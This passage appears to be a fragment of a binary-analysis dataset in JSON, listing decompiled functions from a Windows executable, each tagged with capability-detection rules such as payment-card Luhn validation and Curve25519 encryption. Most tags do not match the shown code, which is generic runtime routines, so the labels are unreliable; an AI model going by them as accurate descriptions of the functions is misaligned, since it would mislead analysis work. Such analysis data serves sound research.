            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404cf0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    \n    if (arg_8h != arg_ch) {\n        puVar3 = arg_ch + 5;\n        puVar2 = arg_8h + 5;\n        do {\n            uVar1 = *puVar2;\n            bVar4 = uVar1 < *puVar3;\n            if (uVar1 != *puVar3) {\ncode_r0x004850a2:\n                return -bVar4 | 1;\n            }\n            if (uVar1 == 0) {\n                return 0;\n            }\n            uVar1 = puVar2[1];\n            bVar4 = uVar1 < puVar3[1];\n            if (uVar1 != puVar3[1]) goto code_r0x004850a2;\n            puVar2 = puVar2 + 2;\n            puVar3 = puVar3 + 2;\n        } while (uVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 268
    },
    "00406299": {
        "rules": [
            "encrypt data using Curve25519/f8ce07bf90384b3481717cbf54aaf528"
        ],
        "decompiled_code": "\nuint * fcn.00406299(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_8h;\n    \n    puVar2 = fcn.00404fd9(0x40, 0x38);\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else if (puVar2 != puVar2 + 0x380) {\n        puVar3 = puVar2 + 8;\n        do {\n            fcn.00404e26(puVar3 + -8, 4000, 0);\n            puVar3[-2] = 0xffffffff;\n            *(puVar3 + 0xd) = *(puVar3 + 0xd) & 0xf8;\n            *puVar3 = 0;\n            puVar3[1] = 0;\n            puVar1 = puVar3 + 6;\n            puVar3[2] = 0xa0a0000;\n            *(puVar3 + 3) = 10;\n            *(puVar3 + 0xe) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3 = puVar3 + 0xe;\n        } while (puVar1 != puVar2 + 0x380);\n    }\n    fcn.00406302(0);\n    return puVar2;\n}\n",
        "token_count": 315
    },
    "0040102d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040102d(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.004060eb(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        cVar2 = fcn.00405d21(unaff_EBX & 0xffffff00 | uVar1);\n        if (cVar2 == '\\0') {\n            *(param_1 + 0x18) = 0xffffffff;\n        }\n        else {\n            *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n        }\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 329
    },
    "00401032": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401032(ulong param_1, uint param_2)\n\n{\n    fcn.00405894(param_1, param_1 >> 0x20, param_2);\n    return;\n}\n",
        "token_count": 48
    },
    "00401064": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401064(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.00405871(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 223
    },
    "0040107d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040107d(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    fcn.0040576d(arg_8h, arg_ch, arg_10h * 2);\n    fcn.00404c50(arg_10h * 2 + arg_8h, arg_18h, arg_14h);\n    *(arg_8h + (arg_10h + arg_14h) * 2) = 0;\n    return;\n}\n",
        "token_count": 131
    },
    "00401127": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401127(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.00404cf0(in_ECX + 4, arg_8h + 4);\n    return -iVar1 & 0xffffff00U | 1 - (iVar1 != 0);\n}\n",
        "token_count": 86
    },
    "00401145": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401145(uint arg_8h, code *arg_ch)\n\n{\n    code *arg_8h_00;\n    code **in_ECX;\n    \n    *in_ECX = vtable.pcharNode.0;\n    arg_8h_00 = fcn.004051dc(arg_ch);\n    in_ECX[1] = arg_8h_00;\n    in_ECX[2] = arg_ch;\n    if (arg_8h_00 == NULL) {\n        in_ECX[2] = NULL;\n    }\n    else {\n        fcn.00491789(arg_8h_00, arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00401163": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401163(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint *in_ECX;\n    uint *puVar1;\n    uint var_4h;\n    \n    if (arg_ch < in_ECX[5] || arg_ch == in_ECX[5]) {\n        puVar1 = in_ECX;\n        if (7 < in_ECX[5]) {\n            puVar1 = *in_ECX;\n        }\n        in_ECX[4] = arg_ch;\n        fcn.004058f3(puVar1, arg_8h, arg_ch * 2);\n        *(arg_ch * 2 + puVar1) = 0;\n    }\n    else {\n        fcn.00404200(arg_ch, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "004011b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004011b3(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = arg_ch[1];\n    iVar2 = *arg_ch + arg_8h;\n    if (-1 < iVar1) {\n        iVar2 = iVar2 + *(*(iVar1 + arg_8h) + arg_ch[2]) + iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 110
    },
    "004011b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004011b8(uint32_t arg_8h, uint noname_1, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t arg_ch;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = in_ECX[4];\n    if (arg_8h <= 0x7fffffffU - iVar2) {\n        arg_ch = in_ECX[5];\n        iVar4 = fcn.0040566e(iVar2 + arg_8h, arg_ch, 0x7fffffff);\n        iVar5 = fcn.00406000(iVar4 + 1);\n        in_ECX[4] = iVar2 + arg_8h;\n        iVar1 = iVar2 + iVar5;\n        in_ECX[5] = iVar4;\n        if (arg_ch < 0x10) {\n            fcn.0040576d(iVar5);\n            fcn.0040314d(iVar1, arg_14h, arg_10h);\n            *(iVar1 + arg_10h) = 0;\n        }\n        else {\n            iVar4 = *in_ECX;\n            fcn.0040576d(iVar5, iVar4, iVar2);\n            fcn.0040314d(iVar1, arg_14h, arg_10h);\n            *(iVar1 + arg_10h) = 0;\n            fcn.00401659(iVar4, arg_ch + 1);\n        }\n        *in_ECX = iVar5;\n        return;\n    }\n    fcn.004038aa();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 429
    },
    "004011ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004011ea(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_ch) {\n        fcn.0040499e(arg_ch, in_ECX, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_ch;\n        if (7 < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.004058f3(in_ECX + iVar1 * 2, arg_8h, arg_ch * 2);\n        *(in_ECX + (iVar1 + arg_ch) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "004614d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004614d7(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_ch + arg_14h;\n    var_4h = arg_10h + arg_18h + CARRY4(arg_ch, arg_14h);\n    if (((*(in_ECX + 0x4c) != 0) && (cVar1 = fcn.0040386e(),  cVar1 != '\\0')) &&\n       (iVar2 = fcn.00405ec5(*(in_ECX + 0x4c), &var_8h),  iVar2 == 0)) {\n        *(in_ECX + 0x44) = arg_20h;\n        *(in_ECX + 0x40) = arg_1ch;\n        fcn.004036cf();\n        iVar2 = *(in_ECX + 0x44);\n        arg_8h[4] = *(in_ECX + 0x40);\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n        arg_8h[2] = 0;\n        arg_8h[3] = 0;\n        arg_8h[5] = iVar2;\n        return;\n    }\n    *arg_8h = -1;\n    arg_8h[1] = -1;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    arg_8h[5] = 0;\n    return;\n}\n",
        "token_count": 440
    },
    "00401258": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401258(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.00402c5c(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 229
    },
    "00401267": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401267(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_8h;\n    \n    puVar2 = fcn.0040681b(&var_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    uVar1 = puVar2[1];\n    *arg_8h = *puVar2;\n    arg_8h[1] = uVar1;\n    return;\n}\n",
        "token_count": 137
    },
    "00401299": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401299(int32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    \n    if (arg_10h != 0) {\n        arg_8h = arg_8h - arg_ch;\n        do {\n            uVar1 = *(arg_8h + arg_ch);\n            if (uVar1 != *arg_ch) {\n                return (-(uVar1 < *arg_ch) & 0xfffffffe) + 1;\n            }\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 168
    },
    "0047c2a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0047c2a0(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t in_ECX;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.00404228(*arg_8h, in_ECX + 8);\n            *arg_8h = uVar1;\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 136
    },
    "00401320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401320(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    uVar1 = arg_8h & 0x80000003;\n    bVar2 = uVar1 == 0;\n    if (uVar1 < 0) {\n        bVar2 = (uVar1 - 1 | 0xfffffffc) == 0xffffffff;\n    }\n    if (bVar2) {\n        uVar1 = arg_8h / 100;\n        if (arg_8h % 100 != 0) goto code_r0x004bacae;\n    }\n    uVar1 = (arg_8h + 0x76c) / 400;\n    if ((arg_8h + 0x76c) % 400 != 0) {\n        return uVar1 & 0xffffff00;\n    }\ncode_r0x004bacae:\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 226
    },
    "004768ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004768ca(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.00404570(arg_8h, arg_ch, arg_10h, arg_14h);\n    if (iVar1 < 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = iVar1 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 123
    },
    "004013f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013f7(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 42
    },
    "00401604": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_310h\n\nvoid __cdecl fcn.00401604(int32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint *puVar1;\n    uint arg_8h_00;\n    uint var_310h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = arg_14h;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((arg_14h == 0) || (arg_8h == 0)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        arg_8h_00 = fcn.004024c3(arg_8h, &arg_ch, &var_310h);\n        fcn.00403c1f(arg_8h_00, &var_310h, arg_10h_00);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    fcn.00403085(var_310h);\n    return;\n}\n",
        "token_count": 289
    },
    "00401631": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401631(uint arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    fcn.004013d4(arg_8h, &var_10h, 0, &var_8h, 0);\n    return arg_8h;\n}\n",
        "token_count": 117
    },
    "00401672": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401672(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x56f428);\n    return;\n}\n",
        "token_count": 49
    },
    "004016a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004016a4(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00491b6a(3, \"FlsSetValue\", 0x54fb50, 0x54fb58);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_TlsSetValue)(arg_8h, arg_ch);\n    }\n    else {\n        (**0x573000)();\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "004016b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004016b8(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = param_1 + 0x3c;\n    iVar2 = **(param_1 + 0xc);\n    if (iVar2 != iVar1) {\n        *(param_1 + 0x50) = iVar2;\n        *(param_1 + 0x54) = **(param_1 + 0x2c) + **(param_1 + 0x1c);\n    }\n    **(param_1 + 0xc) = iVar1;\n    **(param_1 + 0x1c) = iVar1;\n    **(param_1 + 0x2c) = 1;\n    return;\n}\n",
        "token_count": 179
    },
    "004016f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004016f4(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004c8177(4, \"FlsFree\", 0x553228, 0x553230);\n    if (pcVar1 != NULL) {\n        (**0x573000)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004c85f6. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsFree)();\n    return;\n}\n",
        "token_count": 143
    },
    "0040171c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040171c(uint arg_8h, uint arg_ch)\n\n{\n    uint *arg_ch_00;\n    uint *puVar1;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    \n    arg_ch_00 = fcn.004051dc(8);\n    if (arg_ch_00 == NULL) {\n        arg_ch_00 = NULL;\n    }\n    else {\n        *arg_ch_00 = 0;\n        arg_ch_00[1] = 0;\n    }\n    fcn.00404bf6(arg_8h, arg_ch_00);\n    fcn.00401631(&var_8h);\n    fcn.004032bf(&var_10h, 0x20);\n    puVar1 = fcn.004052f9(&var_18h, arg_ch);\n    *arg_ch_00 = *puVar1;\n    arg_ch_00[1] = puVar1[1];\n    return arg_8h;\n}\n",
        "token_count": 227
    },
    "00401735": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401735(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004020f9(arg_8h, arg_8h + 0x34, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 84
    },
    "0047a309": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0047a309(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t lpMultiByteStr;\n    uint var_8h;\n    uint var_4h;\n    \n    lpMultiByteStr = arg_ch;\n    if (arg_14h != 0) {\n        do {\n            if (lpMultiByteStr == arg_10h) break;\n            iVar1 = fcn.00403cdd(&var_4h, lpMultiByteStr, arg_10h - lpMultiByteStr, arg_8h, in_ECX + 8);\n            if (iVar1 < 0) break;\n            if (iVar1 == 0) {\n                iVar1 = 1;\n            }\n            lpMultiByteStr = lpMultiByteStr + iVar1;\n            arg_14h = arg_14h + -1;\n        } while (arg_14h != 0);\n    }\n    return lpMultiByteStr - arg_ch;\n}\n",
        "token_count": 247
    },
    "0040176c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040176c(code *UNRECOVERED_JUMPTABLE)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = **in_FS_OFFSET;\n    // WARNING: Could not recover jumptable at 0x0048497d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 89
    },
    "00401811": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401811(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.004029fa(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 223
    },
    "00401825": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401825(int32_t param_1)\n\n{\n    fcn.004040d9(*(param_1 + 8));\n    fcn.004040d9(*(param_1 + 0xc));\n    fcn.004040d9(*(param_1 + 0x10));\n    return;\n}\n",
        "token_count": 73
    },
    "0040185c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040185c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004067f8();\n    if (iVar1 == 0) {\n        return 0x56ce60;\n    }\n    return iVar1 + 0x14;\n}\n",
        "token_count": 66
    },
    "004018b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004018b1(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004c8177(6, \"FlsSetValue\", 0x553240, 0x553248);\n    if (pcVar1 != NULL) {\n        (**0x573000)(arg_8h, arg_ch);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004c8695. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)();\n    return;\n}\n",
        "token_count": 149
    },
    "004018c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_310h\n\nvoid __cdecl fcn.004018c5(int32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint *puVar1;\n    uint arg_8h_00;\n    uint var_310h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = arg_14h;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((arg_14h == 0) || (arg_8h == 0)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        arg_8h_00 = fcn.00401794(arg_8h, &arg_ch, &var_310h);\n        fcn.00403c1f(arg_8h_00, &var_310h, arg_10h_00);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    fcn.00403085(var_310h);\n    return;\n}\n",
        "token_count": 289
    },
    "00401906": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401906(uint *arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    for (; cVar1 = **0x56f458,  cVar1 != '\\0'; *0x56f458 = *0x56f458 + 1) {\n        if (cVar1 == '@') {\n            puVar5 = fcn.004063b1(&var_8h);\n            uVar2 = puVar5[1];\n            *arg_8h = *puVar5;\n            arg_8h[1] = uVar2;\n            *(arg_8h + 2) = 1;\n            return;\n        }\n        if (0xf < cVar1 + 0xbfU) break;\n        uVar3 = var_8h >> 0x1c;\n        uVar4 = cVar1 - 0x41;\n        uVar6 = var_8h * 0x10;\n        var_8h = uVar6 + uVar4;\n        var_4h = (var_4h << 4 | uVar3) + (uVar4 >> 0x1f) + CARRY4(uVar6, uVar4);\n    }\n    *(arg_8h + 2) = 0;\n    return;\n}\n",
        "token_count": 360
    },
    "0040193d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040193d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004d1e01(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 65
    },
    "00401a46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401a46(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x56f428);\n    return;\n}\n",
        "token_count": 49
    },
    "00401a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401a50(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint32_t arg_1ch)\n\n{\n    fcn.00403e59(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0, arg_1ch & 0xffff);\n    return;\n}\n",
        "token_count": 95
    },
    "00401a55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401a55(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.00403337(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 228
    },
    "004807f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004807f2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040421e(arg_8h, arg_ch, arg_10h, arg_14h, in_ECX + 8);\n    if (iVar1 < 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = iVar1 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 140
    },
    "00401aa5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
